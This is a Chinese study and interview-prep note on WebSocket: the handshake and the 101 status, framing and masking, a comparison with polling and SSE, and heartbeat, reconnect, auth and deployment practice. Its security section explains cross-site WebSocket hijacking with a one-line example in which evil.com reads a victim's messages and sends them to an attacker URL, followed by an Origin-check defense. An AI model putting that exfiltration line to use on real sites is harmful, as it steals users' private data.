# 网络 · 11 WebSocket 与实时通信

> 覆盖：WebSocket 是什么、怎么应用、状态码 101
> 主线：握手 → 帧协议 → 四种实时方案对比 → 工程实践（心跳/重连/鉴权/部署）→ 安全（CSWSH）
>
> 文中「实测」均来自本地 Node `http` + `ws` 服务：Accept 计算、掩码校验、分片重组、ping/pong、关闭码。

---

## 目录

- [11.1 一句话结论](#111-一句话结论)
- [11.2 握手：从 HTTP 升级到 WebSocket](#112-握手从-http-升级到-websocket)
- [11.3 帧协议：为什么 WebSocket 没有「粘包」](#113-帧协议为什么-websocket-没有粘包)
- [11.4 四种实时方案对比（这道题的真正考点）](#114-四种实时方案对比这道题的真正考点)
- [11.5 工程实践（比协议细节更重要）](#115-工程实践比协议细节更重要)
- [11.6 安全：CSWSH（跨站 WebSocket 劫持）](#116-安全cswsh跨站-websocket-劫持)
- [11.7 常见坑](#117-常见坑)
- [11.8 答题模板](#118-答题模板)
- [11.9 速记卡](#119-速记卡)

---

## 11.1 一句话结论

WebSocket 是**在单个 TCP 连接上的全双工协议**，通过一次 **HTTP Upgrade 握手（返回 101）**从 HTTP 升级而来，之后双方可以**任意方向、任意时刻**发消息。
它解决了 HTTP「只能客户端主动请求」的限制，代价是**要自己处理心跳、重连、鉴权、负载均衡**。

---

## 11.2 握手：从 HTTP 升级到 WebSocket

### 11.2.1 完整握手

```http
① 客户端发起（这是一个标准的 HTTP/1.1 请求）
GET /chat HTTP/1.1
Host: example.com
Upgrade: websocket                    ← 我要升级协议
Connection: Upgrade                   ← 配合 Upgrade 使用
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==      ← 16 字节随机数的 base64
Sec-WebSocket-Version: 13             ← 协议版本（RFC 6455 规定为 13）
Origin: https://example.com           ← 浏览器自动带（服务端应校验）
```

```http
② 服务端同意（101 Switching Protocols）
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=   ← 校验值
```

```http
③ 之后这个 TCP 连接不再说 HTTP，改说 WebSocket 帧
```

### 11.2.2 `Sec-WebSocket-Accept` 怎么算

```
Sec-WebSocket-Accept = base64( SHA1( Sec-WebSocket-Key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11" ) )
                                                                 ↑
                                                    这是一个固定的「魔法字符串」（RFC 6455 规定）
```

RFC 6455 的示例，本地用 `crypto` 复算一致：

```
Key    = "dGhlIHNhbXBsZSBub25jZQ=="
拼接后  = "dGhlIHNhbXBsZSBub25jZQ==258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
SHA1   = 0xb3 7a 4f 2c c0 62 4f 16 90 f6 46 06 cf 38 59 45 b2 be c4 ea
base64 = "s3pPLMBiTxaQ9kYGzzhZRbK+xOo="
```

服务端实现（Node.js）：

```js
const crypto = require('node:crypto');
const GUID = '258EAFA5-E914-47DA-95CA-C5AB0DC85B11';

function acceptKey(clientKey) {
  return crypto.createHash('sha1').update(clientKey + GUID).digest('base64');
}
```

### 11.2.3 为什么要这个「魔法字符串」

**不是为了加密，也不是为了认证**。作用只有一个：证明对端真的按 RFC 6455 算出了 Accept。

| 能防住什么 | 说明 |
|---|---|
| 普通 HTTP 服务器误判 | 只会回显请求头的服务器算不出 Accept，握手失败，不会把连接误当成 WebSocket |
| 非 WebSocket 客户端误连 | 只有实现了帧协议、握手规则的一端才会做这套计算 |

> `Sec-WebSocket-Key` **不是认证凭据**，只是随机数。**任何人都能算 Accept**，所以它**不提供任何安全性**。真正的安全靠 **TLS（wss://）+ 服务端校验 Origin + 应用层鉴权**。
> 防代理缓存投毒靠的是**客户端掩码**（见 11.3.3），与这个 GUID 无关。

### 11.2.4 握手失败会怎样

| 情况 | 结果 |
|---|---|
| 服务端不支持 WebSocket | 返回普通 HTTP 响应（比如 200）→ 客户端报 `Error during WebSocket handshake` |
| 服务端拒绝（比如鉴权失败） | 可以返回 401/403（**但浏览器只报握手失败，拿不到状态码**） |
| 代理不支持 Upgrade | 连接被断开，或返回 400 |
| 服务端没校验 Origin | 握手成功（**这就是 CSWSH 漏洞**） |

**排查限制**：浏览器不把握手失败时的 HTTP 状态码暴露给 JS（`onerror` 只给一个 `Event`），只能看 Network 面板或服务端日志。

---

## 11.3 帧协议：为什么 WebSocket 没有「粘包」

### 11.3.1 帧格式

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-------+-+-------------+-------------------------------+
|F|R|R|R| opcode|M| Payload len |    Extended payload length    |
|I|S|S|S|  (4)  |A|     (7)     |         (16/64 bits)          |
|N|V|V|V|       |S|             |  (if len == 126 or 127)       |
| |1|2|3|       |K|             |                               |
+-+-+-+-+-------+-+-------------+ - - - - - - - - - - - - - - - +
|     Extended payload length continued (if len == 127)         |
+ - - - - - - - - - - - - - - - +-------------------------------+
|                               |  Masking-key (if MASK set)    |
+-------------------------------+-------------------------------+
|                         Payload Data ...                      |
+---------------------------------------------------------------+
```

**四个关键字段**：

| 字段 | 作用 |
|---|---|
| **FIN**（1 位） | 是否是消息的最后一帧（支持**分片**） |
| **opcode**（4 位） | 帧类型（见下表） |
| **MASK**（1 位） | 客户端发出的帧**必须为 1**（加掩码），服务端帧为 0 |
| **Payload len**（7/7+16/7+64 位） | **数据长度**，接收方据此切帧 |

**opcode 表**：

| 值 | 类型 | 说明 |
|---|---|---|
| `0x0` | Continuation | 分片的后续帧 |
| `0x1` | **Text** | UTF-8 文本 |
| `0x2` | **Binary** | 二进制 |
| `0x8` | **Close** | 关闭连接（可带关闭码） |
| `0x9` | **Ping** | 心跳 |
| `0xA` | **Pong** | 心跳响应 |

### 11.3.2 为什么没有粘包

**因为每一帧都有明确的 `Payload len`**：接收方按帧头长度精确切分，帧与帧天然有边界；FIN 加 opcode `0x0` 再把多帧拼成一条消息。

对比裸 TCP：没有长度前缀就只能靠分隔符或定长约定，于是有了「粘包」这个应用层问题。WebSocket 把长度字段和分片标志放进了协议层，**应用层每条 `message` 事件就是一条完整消息**。

本地实测（`ws` 服务端）：依次发 `frag-` / `ment` / `ed` 三帧（FIN=0,0,1，opcode=1,0,0），服务端 `message` 事件只触发一次，内容为 `frag-mented`。

### 11.3.3 为什么要 MASK（掩码）

**规范要求：客户端发出的所有帧必须加掩码（`MASK=1`），服务端发出的帧不能加。**

**掩码算法**：

```js
// 4 字节随机掩码，循环 XOR
function mask(payload, maskKey) {
  const out = Buffer.allocUnsafe(payload.length);
  for (let i = 0; i < payload.length; i++) {
    out[i] = payload[i] ^ maskKey[i % 4];
  }
  return out;
}
```

**为什么要掩码**（RFC 6455 §10.3）：历史上存在代理缓存投毒攻击——攻击者让受害者浏览器发出「看起来像 HTTP 请求」的字节流，骗代理缓存下来，再让后续用户命中。WebSocket 允许客户端发任意字节，不加掩码就能构造出形状固定的「伪 HTTP 请求」。**掩码用随机数把 payload 打散，攻击者无法预测线上字节**。

本地实测（`ws` 服务端）：发一个 `MASK=0` 的文本帧，服务端回 `Close` 帧，payload `03ea` 即关闭码 **1002**（协议错误），同时报 `WS_ERR_EXPECTED_MASK`；正常掩码帧的回包 `MASK=0`（服务端帧不加掩码）。

---

## 11.4 四种实时方案对比（这道题的真正考点）

### 11.4.1 总表

| 方案 | 方向 | 实时性 | 连接数 | 协议 | 自动重连 | 二进制 | 适用 |
|---|---|---|---|---|---|---|---|
| **短轮询（Polling）** | 客户端拉 | 差（取决于间隔） | 每次新建 | HTTP | — | ✅ | 极简场景、兼容性优先 |
| **长轮询（Long Polling）** | 客户端拉（挂起） | 较好 | 每次占用一个 | HTTP | 需自己实现 | ✅ | 兼容老浏览器、消息频率低 |
| **SSE（EventSource）** | **服务端推**（单向） | 好 | 1 个 | HTTP | ✅ **内置** | ❌ 只文本 | 通知、进度、日志流 |
| **WebSocket** | **双向** | **最好** | 1 个 | WS（Upgrade） | ❌ 需自己实现 | ✅ | 聊天、协作、游戏、行情 |

### 11.4.2 短轮询

```js
setInterval(async () => {
  const res = await fetch('/api/messages');
  const list = await res.json();
  render(list);
}, 3000);
```

- **实时性差**：最多延迟一个轮询间隔
- **无效请求多**：没数据也发
- **服务端压力大**：QPS = 用户数 / 间隔
- 优点：实现最简单，纯 HTTP，穿代理和防火墙的兼容性最好

### 11.4.3 长轮询

```js
async function longPoll() {
  while (true) {
    try {
      const res = await fetch('/api/messages?timeout=30');
      const data = await res.json();
      if (data.length) render(data);
    } catch (e) {
      await sleep(1000);
    }
  }
}
```

**服务端**：请求到达后**不立即返回**，挂起（比如 30 秒），有数据就返回，超时返回空。

- 优点：有数据立即返回，兼容纯 HTTP
- 代价：每个在线用户占一个挂起连接；一次数据要两次请求；代理/网关超时要调（`proxy_read_timeout`）

### 11.4.4 SSE（Server-Sent Events）

只需要服务端推时，SSE 比 WebSocket 简单：

```js
const es = new EventSource('/api/stream');

es.onmessage = (e) => console.log(e.data);
es.addEventListener('custom', (e) => console.log(e.data));
es.onerror = () => { /* 浏览器会自动重连 */ };
```

**服务端响应格式**：

```http
HTTP/1.1 200 OK
Content-Type: text/event-stream
Cache-Control: no-cache
Connection: keep-alive

data: 第一条消息\n
\n
event: progress\n
id: 1\n
data: {"percent": 50}\n
\n
retry: 3000\n
data: 断线后 3 秒重连\n
\n
```

| 字段 | 作用 |
|---|---|
| `data:` | 消息内容（多行就写多个 `data:`） |
| `event:` | 事件名（对应 `addEventListener`） |
| `id:` | 消息 ID，断线重连时浏览器会带 `Last-Event-ID` 头 |
| `retry:` | 重连间隔（毫秒） |

| 维度 | SSE |
|---|---|
| 重连 | 浏览器内置，带 `Last-Event-ID` **断点续传** |
| 传输 | 纯 HTTP，不用 Upgrade，穿代理和防火墙 |
| 版本 | HTTP/2 下可多路复用，不受同域 6 连接限制 |
| 方向 | **单向**，只能服务端 → 客户端，客户端发消息得另发 HTTP |
| 数据 | **只文本**，二进制要 base64（体积 +33%） |
| 兼容 | IE 不支持 |

**典型适用**：大模型逐字返回的流式输出、构建进度、只读行情、日志流、通知。

### 11.4.5 四者怎么选

```
需要「客户端频繁发消息」吗？
├─ 需要（聊天、协作编辑、游戏）→ WebSocket
└─ 不需要（只需要服务端推）
     ├─ 消息频率很低（分钟级）→ 短轮询（最省事）
     ├─ 要兼容极老浏览器 → 长轮询
     └─ 现代浏览器 → SSE（自动重连 + 断点续传，比 WebSocket 简单）
```

---

## 11.5 工程实践（比协议细节更重要）

### 11.5.1 心跳：为什么必须有

**问题**：中间的 NAT、代理、负载均衡会在「连接空闲一段时间」后**静默断开**，而两端都不知道。

| 中间设备 | 典型空闲超时 |
|---|---|
| Nginx `proxy_read_timeout` | **默认 60 秒** |
| 云厂商 SLB / ALB | 分钟级，按产品配置 |
| 家用路由器 NAT | 几分钟到几十分钟 |
| 移动网络（4G/5G） | 可能很快（基站切换） |

**断了但双方都不知道** = 消息发出去石沉大海，用户以为连着。

**解法：心跳保活（应用层消息或协议层 ping/pong）**

```js
// 客户端
const HEARTBEAT_INTERVAL = 30000;
let heartbeatTimer;

function startHeartbeat(ws) {
  clearInterval(heartbeatTimer);
  heartbeatTimer = setInterval(() => {
    if (ws.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify({ type: 'ping', ts: Date.now() }));
    }
  }, HEARTBEAT_INTERVAL);
}
```

```js
// 服务端：每轮发协议层 ping，上一轮没回 pong 就断开
wss.on('connection', (ws) => {
  ws.isAlive = true;
  ws.on('pong', () => { ws.isAlive = true; });
});

setInterval(() => {
  wss.clients.forEach((client) => {
    if (!client.isAlive) return client.terminate();
    client.isAlive = false;
    client.ping();                                    // opcode 0x9
  });
}, HEARTBEAT_INTERVAL);
```

| 层级 | 方式 | 优点 | 缺点 |
|---|---|---|---|
| **协议层** | `ping` / `pong` 帧（opcode 0x9 / 0xA） | 标准；空 payload 时只有 2 字节帧头 | 浏览器 JS **不能主动发 ping**，只能服务端发、浏览器自动回 pong |
| **应用层** | 自己发 `{"type":"ping"}` | 浏览器可控、可以带业务信息（如在线状态） | 多一条业务消息 |

**限制**：浏览器 WebSocket API 没有发 ping 帧的方法；想让客户端主动探测，只能走应用层心跳。

**心跳间隔**：取小于中间设备最小空闲超时的一半，所以 Nginx 默认 60 秒时常用 30 秒。

### 11.5.2 重连：指数退避 + 抖动

```js
class ReconnectingWS {
  constructor(url) {
    this.url = url;
    this.retry = 0;
    this.maxRetry = 10;
    this.connect();
  }

  connect() {
    this.ws = new WebSocket(this.url);

    this.ws.onopen = () => {
      this.retry = 0;                    // 成功就重置
      this.startHeartbeat();
    };

    this.ws.onclose = () => {
      this.stopHeartbeat();
      this.scheduleReconnect();
    };

    this.ws.onerror = () => this.ws.close();
  }

  scheduleReconnect() {
    if (this.retry >= this.maxRetry) return;

    // 指数退避 + 随机抖动
    const base = Math.min(30000, 1000 * 2 ** this.retry);
    const jitter = Math.random() * 1000;
    const delay = base + jitter;

    this.retry++;
    setTimeout(() => this.connect(), delay);
  }
}
```

**抖动防的是惊群（thundering herd）**：服务端重启时所有客户端同时断线，退避时间相同就会在同一时刻重连，把刚恢复的服务再打垮；随机抖动把重连时间摊开。

### 11.5.3 鉴权：握手时怎么带 token

**WebSocket 的 JS API 不支持自定义请求头**（只能 `new WebSocket(url, protocols)`），所以有四种做法：

| 方式 | 做法 | 优点 | 缺点 |
|---|---|---|---|
| **① Query 参数** | `wss://api.com/ws?token=xxx` | 最简单 | **token 会进访问日志、监控系统** ⚠️ |
| **② 子协议（protocols）** | `new WebSocket(url, ['bearer', token])` | 不进 URL | 子协议本用于协商消息格式，放 token 属于语义滥用 |
| **③ Cookie** | 依赖同站 cookie 自动带 | 无需改代码 | **跨站需要 `SameSite=None`；且会带来 CSWSH 风险** |
| **④ 先 HTTP 换 ticket** | 先 `POST /ws-ticket` 拿一次性 ticket，再 `wss://...?ticket=xxx` | **最安全**（一次性、短有效期、不进长期日志） | 多一次请求 |

**推荐方案 ④**：

```js
// ① 先用普通 HTTP（能带 Authorization 头）换一个一次性 ticket
const { ticket } = await fetch('/api/ws-ticket', {
  method: 'POST',
  headers: { Authorization: `Bearer ${accessToken}` },
}).then((r) => r.json());

// ② 用 ticket 建 WS（ticket 一次性、30 秒有效）
const ws = new WebSocket(`wss://api.com/ws?ticket=${ticket}`);
```

**握手时校验一次不够**：WebSocket 连接可能活几小时，token 15 分钟过期后连接不会自动断。服务端要定时检查：

```js
// 服务端定时检查连接绑定的 token 是否还有效
setInterval(() => {
  for (const [ws, meta] of connections) {
    if (Date.now() > meta.tokenExpireAt) {
      ws.close(4001, 'token expired');    // 私有区间关闭码
    }
  }
}, 60000);
```

### 11.5.4 负载均衡：WebSocket 的部署难题

**问题**：WebSocket 是**有状态的长连接**，而 HTTP 是无状态的。

```
用户 A 连到 server-1，用户 B 连到 server-2
    ↓
A 给 B 发消息
    ↓
server-1 没有 B 的连接 → 消息发不出去
```

**三种解法**：

| 方案 | 说明 | 适用 |
|---|---|---|
| **① 粘性会话（sticky session）** | 同一用户的请求都路由到同一台机器（按 IP 或 cookie hash） | 小规模；扩容时会有连接迁移问题 |
| **② 共享存储（Redis Pub/Sub）** | 所有节点订阅同一个频道，消息广播给所有节点，各节点推给自己连接的用户 | **主流方案** |
| **③ 专门的消息网关** | 用 Socket.IO Redis Adapter、Centrifugo、EMQX 等 | 大规模 |

```js
// Redis Pub/Sub 方案示意
const pub = redis.duplicate();
const sub = redis.duplicate();

sub.subscribe('ws:broadcast');
sub.on('message', (channel, msg) => {
  const { userId, payload } = JSON.parse(msg);
  const ws = connections.get(userId);
  if (ws) ws.send(payload);          // 只有持有该用户连接的节点会真的发出去
});

// 任意节点要发给某个用户
pub.publish('ws:broadcast', JSON.stringify({ userId, payload }));
```

**部署细节**：**Nginx 必须配 `proxy_http_version 1.1` 和 `Upgrade` 头**，否则 WebSocket 握手过不去。

```nginx
location /ws {
    proxy_pass http://backend;
    proxy_http_version 1.1;                          # ★ 必须是 1.1
    proxy_set_header Upgrade $http_upgrade;          # ★
    proxy_set_header Connection "upgrade";           # ★
    proxy_set_header Host $host;
    proxy_read_timeout 3600s;                        # 长连接，别用默认 60 秒
    proxy_send_timeout 3600s;
}
```

### 11.5.5 断线重连后的消息补偿

**问题**：断线期间服务器发的消息会丢。重连后要补。

**方案**：消息带**单调递增的序号**，客户端记录最后收到的 seq，重连时带上：

```js
// 客户端重连
const ws = new WebSocket(`wss://api.com/ws?lastSeq=${lastSeq}`);

// 服务端：从 lastSeq 之后开始补发
wss.on('connection', async (socket, req) => {
  const lastSeq = Number(new URL(req.url, 'http://x').searchParams.get('lastSeq') || 0);
  const missed = await db.messages.find({ seq: { $gt: lastSeq } }).limit(1000);
  missed.forEach((m) => socket.send(JSON.stringify(m)));
});
```

**缺口太大**（比如离线一小时）就不要补增量，直接让客户端拉一次全量快照，再按 seq 续增量。

---

## 11.6 安全：CSWSH（跨站 WebSocket 劫持）

### 11.6.1 攻击原理

**WebSocket 握手不受同源策略限制，而且会带 Cookie。**

```
① 用户登录了 bank.com，浏览器有 bank.com 的 cookie
② 用户访问了 evil.com
③ evil.com 的 JS 执行：
     const ws = new WebSocket('wss://bank.com/ws');
     ws.onmessage = (e) => fetch('https://evil.com/steal?data=' + e.data);
④ 浏览器发起握手，【带上了 bank.com 的 cookie】
⑤ bank.com 服务端看到 cookie 有效 → 握手成功
⑥ ★ 关键：evil.com 的 JS 能【读】WebSocket 的消息！
```

这就是 **CSWSH（Cross-Site WebSocket Hijacking）**。

| | CSRF | CSWSH |
|---|---|---|
| 能否读响应 | ❌ 不能 | ✅ **能**（WebSocket 没有同源限制） |
| 危害 | 请求被执行（转账、改密码） | **数据泄露 + 操作执行**（更严重） |

### 11.6.2 防御

**核心防御：服务端校验 `Origin` 头。**

```js
const ALLOWED_ORIGINS = new Set([
  'https://bank.com',
  'https://www.bank.com',
]);

wss.on('connection', (ws, req) => {
  const origin = req.headers.origin;

  // ★ 必须校验！Origin 缺失也要拒绝
  if (!origin || !ALLOWED_ORIGINS.has(origin)) {
    ws.close(1008, 'origin not allowed');
    return;
  }
  // ...
});
```

1. **`Origin` 由浏览器写入，页面 JS 改不了**，所以可信。
2. **`Origin` 缺失时不能放行**：非浏览器客户端可以自己伪造，业务只服务浏览器时缺失即视为不可信。
3. **不要只靠 Cookie 鉴权**——Cookie 会自动带，等于把身份送给了攻击者；要额外用一次性 ticket 或子协议里的 token。

---

## 11.7 常见坑

| 坑 | 正确说法 |
|---|---|
| 说「WebSocket 是基于 HTTP 的」 | 只在**握手**时借用了 HTTP，之后是**独立的 TCP 上的帧协议** |
| 说「`Sec-WebSocket-Key` 是认证用的」 | 不是，只是随机数，**提供零安全性** |
| 说「WebSocket 有粘包」 | 没有，帧头有 payload 长度和 FIN 标志 |
| 说「WebSocket 不受同源策略限制所以很安全」 | 恰恰相反，**这是安全隐患**（CSWSH） |
| 忘了配 `proxy_read_timeout` | 默认 60 秒断开，表现为「WebSocket 老断」 |
| 忘了 `proxy_http_version 1.1` | 握手直接失败 |
| 心跳设 60 秒以上 | 中间设备可能已经断了，心跳没意义 |
| 重连不加抖动 | 服务端重启时惊群 |
| 只在握手时校验 token | 连接活几小时，token 过期了也不会断 |
| 用 query 传长期 token | 会进访问日志和监控，应用一次性 ticket |
| 用 `ws.send` 不判断 `readyState` | `CONNECTING` 时抛 `InvalidStateError`，`CLOSING`/`CLOSED` 时静默丢弃 |
| 以为 SSE 需要 WebSocket | SSE 是纯 HTTP，更简单，还自带重连 |
| 单机部署不考虑负载均衡 | 多节点时必须用 Redis Pub/Sub 或粘性会话 |

**`readyState` 的四个值**

| 值 | 常量 | 含义 |
|---|---|---|
| 0 | `CONNECTING` | 连接中 |
| 1 | `OPEN` | 已连接，可发消息 |
| 2 | `CLOSING` | 关闭中 |
| 3 | `CLOSED` | 已关闭 |

```js
function safeSend(ws, data) {
  if (ws.readyState !== WebSocket.OPEN) {
    // 别丢掉：放进待发队列，重连后统一发
    pendingQueue.push(data);
    return false;
  }
  ws.send(data);
  return true;
}
```

---

## 11.8 答题模板

### 30 秒版

- WebSocket 是单条 TCP 连接上的全双工协议，靠一次 HTTP Upgrade 握手（101）建立，之后双方任意时刻都能发消息。
- 它补上了 HTTP 只能客户端主动请求的短板，适合聊天、协作、行情这类双向高频场景。
- 代价是要自己处理心跳、重连、鉴权和负载均衡。

### 2 分钟版

- **握手**：标准 HTTP 请求带 `Upgrade: websocket`、`Connection: Upgrade`、`Sec-WebSocket-Key`、`Sec-WebSocket-Version: 13`；服务端回 101 + `Sec-WebSocket-Accept = base64(sha1(key + 固定 GUID))`。Key 不是凭据，不提供安全性。
- **帧**：FIN 表示消息是否结束（支持分片），opcode 区分 text/binary/close/ping/pong，payload 长度字段 7/16/64 位，因此没有粘包；客户端帧必须加掩码，服务端帧不加。
- **选型**：短轮询最简单但实时性差；长轮询实时性好但每客户端挂一个连接；SSE 纯 HTTP 单向推送、自带重连和 `Last-Event-ID`；需要双向高频才上 WebSocket。
- **工程**：心跳小于中间设备空闲超时，浏览器不能主动发 ping 帧；重连指数退避 + 抖动；鉴权用一次性 ticket；多节点用 Redis Pub/Sub 广播；Nginx 要 `proxy_http_version 1.1` + `Upgrade` + 调大 `proxy_read_timeout`。
- **安全**：握手不受同源策略限制且会带 Cookie，存在 CSWSH（攻击者能读消息），防御是服务端校验 Origin，并且不只靠 Cookie 鉴权。

### 追问表

| 追问 | 回答要点 |
|---|---|
| 101 是什么 | Switching Protocols，WebSocket 握手成功 |
| `Sec-WebSocket-Key` 有什么用 | 只是随机数，配合 GUID 算 Accept，**不提供安全性** |
| 为什么要那个魔法 GUID | 证明对端按 RFC 6455 算出 Accept，普通 HTTP 服务器或回显式代理算不出来 |
| WebSocket 有粘包吗 | 没有，帧头有 payload 长度 + FIN |
| 为什么客户端帧要加掩码 | 防代理缓存投毒（历史攻击） |
| WebSocket 受同源限制吗 | **不受**，所以有 CSWSH 风险 |
| 怎么防 CSWSH | 服务端校验 `Origin` + 不只靠 Cookie 鉴权 |
| 为什么要心跳 | Nginx 60 秒、SLB 有超时，会静默断开 |
| 浏览器能发 ping 帧吗 | 不能，只有服务端能发，浏览器自动回 pong |
| 重连为什么要抖动 | 防惊群（服务端重启时同时重连） |
| 鉴权怎么带 token | HTTP 换一次性 ticket 最安全；query 会进日志 |
| 多节点怎么部署 | Redis Pub/Sub 广播，或粘性会话 |
| Nginx 怎么配 | `proxy_http_version 1.1` + `Upgrade` + 调大 `read_timeout` |
| SSE 和 WebSocket 区别 | SSE 单向、纯 HTTP、自带重连、只文本 |
| 断线消息怎么补 | 消息带 seq，重连带 lastSeq 补发；缺太多就拉快照 |
| 为什么 WebSocket 握手失败看不到错误码 | 浏览器安全考虑，只给 onerror 一个 Event |

---

## 11.9 速记卡

```
握手
  GET + Upgrade: websocket + Connection: Upgrade + Sec-WebSocket-Key + Version: 13
  ← 101 Switching Protocols + Sec-WebSocket-Accept
  Accept = base64(sha1(Key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"))
  Key 不是认证凭据，零安全性；GUID 只证明对端理解协议

帧
  FIN（分片）+ opcode（1=text 2=binary 8=close 9=ping A=pong）+ 长度字段
  ★ 有长度字段 → 没有粘包
  客户端帧必须加掩码 → 防代理缓存投毒（未加掩码 → 1002）

四种方案
  短轮询：简单，实时性差，无效请求多
  长轮询：实时性好，每客户端占一个挂起连接
  SSE：纯 HTTP 单向、自带重连 + Last-Event-ID、只文本
  WebSocket：双向、最好、要自己做重连

工程实践（重点）
  心跳 30s（小于中间设备空闲超时）；浏览器不能主动发 ping 帧
  重连：指数退避 + 随机抖动（防惊群）
  鉴权：HTTP 换一次性 ticket（query 里的长期 token 会进日志）
  连接长活 → 服务端定时校验 token 过期（4001）
  负载均衡：Redis Pub/Sub 广播（有状态连接）
  Nginx：proxy_http_version 1.1 + Upgrade + proxy_read_timeout 3600s
  断线补偿：seq + lastSeq 补发；缺太多拉快照

安全
  CSWSH：握手不受 SOP 限制 + 会带 Cookie → 攻击者能【读】消息
  防御：校验 Origin + 不只靠 Cookie 鉴权
```
